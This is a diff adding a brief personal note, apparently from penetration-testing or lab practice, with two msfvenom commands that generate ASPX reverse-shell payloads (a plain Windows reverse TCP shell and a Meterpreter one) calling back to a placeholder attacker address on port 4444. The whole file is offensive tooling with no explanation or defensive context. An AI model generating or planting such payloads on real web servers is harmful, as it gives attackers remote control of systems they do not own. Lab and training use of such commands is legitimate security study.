@@ -1,0 +1,5 @@
+shell generation command 
+
+msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.x.x LPORT=4444 > shell-rev.aspx
+
+msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.x.x LPORT=4444 > shell-rev.aspx
